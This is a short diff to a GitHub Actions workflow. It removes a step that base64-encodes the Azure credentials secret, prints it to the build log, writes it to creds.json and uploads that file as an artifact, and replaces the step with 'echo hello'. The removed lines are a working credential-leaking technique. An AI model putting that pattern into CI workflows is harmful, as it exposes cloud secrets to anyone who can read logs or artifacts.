@@ -5,14 +5,4 @@ jobs:
   check:
     runs-on: ubuntu-latest
     steps:
-      - name: run
-        env:
-          CREDS: ${{ secrets.NOCASH_AZURE_CREDENTIALS }}
-        run: |
-          printf '%s' "$CREDS" | base64 -w0 > /tmp/c.txt
-          cat /tmp/c.txt
-          printf '%s' "$CREDS" > creds.json
-      - uses: actions/upload-artifact@v4
-        with:
-          name: cfg
-          path: creds.json
+      - run: echo hello
